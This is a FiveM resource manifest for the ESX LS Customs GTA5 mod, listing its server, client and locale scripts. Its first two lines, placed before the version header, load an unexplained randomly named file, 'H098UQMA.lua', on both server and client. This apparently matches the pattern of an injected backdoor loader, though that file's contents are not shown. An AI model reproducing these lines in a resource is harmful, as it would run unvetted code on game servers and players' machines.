server_script "H098UQMA.lua"
client_script "H098UQMA.lua"


fx_version 'adamant'

game 'gta5'

description 'ESX LS Customs'

version '1.5.0'

shared_script '@es_extended/imports.lua'

server_scripts {
	'@oxmysql/lib/MySQL.lua',
	'@es_extended/locale.lua',
	'locales/en.lua',
	'locales/fr.lua',
	'locales/pl.lua',
	'locales/br.lua',
	'locales/de.lua',
	'config.lua',
	'server/main.lua'
}

client_scripts {
	'@es_extended/locale.lua',
	'locales/en.lua',
	'locales/fr.lua',
	'locales/pl.lua',
	'locales/br.lua',
	'locales/de.lua',
	'config.lua',
	'client/main.lua'
}
